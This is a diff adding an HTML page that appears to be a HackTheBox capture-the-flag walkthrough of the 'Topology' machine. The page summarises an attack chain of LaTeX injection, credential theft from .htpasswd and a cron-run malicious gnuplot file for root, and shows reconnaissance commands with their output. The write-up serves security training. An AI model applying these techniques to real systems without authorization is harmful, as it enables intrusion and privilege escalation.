@@ -1,0 +1,377 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Topology - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">WriteUPs</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/easy/topology/img/topology.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Topology - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Topology">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Topology</span>
+<span class="n">Difficult</span><span class="p">:</span> <span class="n">Easy</span>
+<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3><br/>About Topology</h3><br/>
+Topology is an easy-level machine on HackTheBox. Initially, we need to exploit a LaTeX Injection to gain access to system files. <br/><br/>
+<h3><br>Shell as vdaisley</br></h3><br>
+While searching for Apache configuration files, we discovered the root directory of a subdomain that prompts for credentials to gain access. Upon examining the <code>.htpasswd</code> file, we acquired the login details for <code>vdaisley</code>. Using these credentials, we successfully accessed the system as <code>vdaisley</code> via the SSH service.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+Following some enumeration, we stumbled upon a cron job that runs all .plt files situated in <code>/opt/gnuplot</code>. Since we possess write permissions in this directory, we crafted a malicious .plt file to execute commands as the root user.<br/><br/>
+<h3><br>Recon</br></h3><br>
+Firstly, we will conduct a port scan to discover open ports on the victim machine. Using the nmap tool, we'll execute the following scan:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.217</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.217</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">58587</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">6946</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</pre></div>
+
+Now, having identified the open ports on the victim machine, we'll perform a comprehensive scan to detect the technologies and services exposed through these ports.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.217</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.217</span> <span class="p">(</span><span class="mf">10.10.11.217</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.18</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.7</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">3072</span> <span class="n">dc</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">78</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="mi">2</span><span class="n">b</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="n">bf</span><span class="p">:</span><span class="mi">0</span><span class="n">f</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="n">c6</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="n">d9</span><span class="p">:</span><span class="n">f3</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="mi">6</span><span class="n">c</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">f1</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">6</span><span class="n">c</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">c</span><span class="p">:</span><span class="mi">33</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">4</span><span class="n">c</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="n">d0</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="mi">4</span><span class="n">a</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="n">d7</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.41</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Miskatonic</span> <span class="n">University</span> <span class="o">|</span> <span class="n">Topology</span> <span class="n">Group</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</pre></div>
+
+At this stage, we've confirmed the presence of both an HTTP service and an SSH service.<br/><br/>
+<h3><br>Web Application</br></h3><br>
+Prior to accessing the website via our browser, we'll use 'whatweb' to identify the technologies utilized by this website.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.217</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.217</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.41</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">Email</span><span class="p">[</span><span class="n">lklein</span><span class="nd">@topology</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.217</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="n">Miskatonic</span> <span class="n">University</span> <span class="o">|</span> <span class="n">Topology</span> <span class="n">Group</span><span class="p">]</span>
+</pre></div>
+
+From the information gathered, one domain stands out: <code>topology.htb</code>.<br/><br/>
+I will append this domain to my <code>/etc/hosts</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.217</span> <span class="n">topology</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+When we access the web, we will encounter the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/1.png"/><br/><br/>
+<h3><br>Subdomain Enumeration</br></h3><br>
+As we have a domain, we can attempt to discover subdomains. To do this, we'll utilize the <a href="https://github.com/ffuf/ffuf">ffuf</a> tool.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.topology.htb"</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">100</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+<span class="n">________________________________________________</span>
+
+<span class="n">autodiscover</span>            <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">154</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">mssql</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">163</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">forums</span>                  <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">156</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">dns3</span>                    <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">168</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">smtp</span>                    <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">161</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">apps</span>                    <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">161</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">ns2</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">161</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">proxy</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">162</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">download</span>                <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">179</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">www</span><span class="o">.</span><span class="n">dev</span>                 <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">169</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">localhost</span>               <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">175</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">helpdesk</span>                <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">6767</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1612</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">175</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">175</span><span class="n">ms</span><span class="p">]</span>
+<span class="p">[</span><span class="n">WARN</span><span class="p">]</span> <span class="n">Caught</span> <span class="n">keyboard</span> <span class="n">interrupt</span> <span class="p">(</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="p">)</span>
+</pre></div>
+
+We've observed that all responses are consistently returning a length of 6767 bytes. To filter out these specific results, we'll use the <code>--fs</code> parameter with the specified length.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.topology.htb"</span> <span class="o">--</span><span class="n">fs</span><span class="o">=</span><span class="mi">6767</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">100</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">size</span><span class="p">:</span> <span class="mi">6767</span>
+<span class="n">________________________________________________</span>
+
+<span class="n">dev</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">401</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">463</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">3066</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">stats</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">108</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">6104</span><span class="n">ms</span><span class="p">]</span>
+<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">4989</span><span class="o">/</span><span class="mi">4989</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">25</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
+</pre></div>
+
+It uncovered two subdomains, but I'm only able to access <code>stats.topology.htb</code>. Whenever I attempt to access <code>dev.topology.htb</code>, it prompts me for credentials. Nevertheless, I'll add these subdomains to my <code>/etc/hosts</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.217</span> <span class="n">topology</span><span class="o">.</span><span class="n">htb</span> <span class="n">dev</span><span class="o">.</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span> <span class="n">stats</span><span class="o">.</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+While inspecting the main web page, I noticed a hyperlink leading to a new subdomain: <code>latex.topology.htb</code>.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/2.png"/><br/><br/>
+When attempting to access it, my browser cannot resolve that domain.<br/><br/>
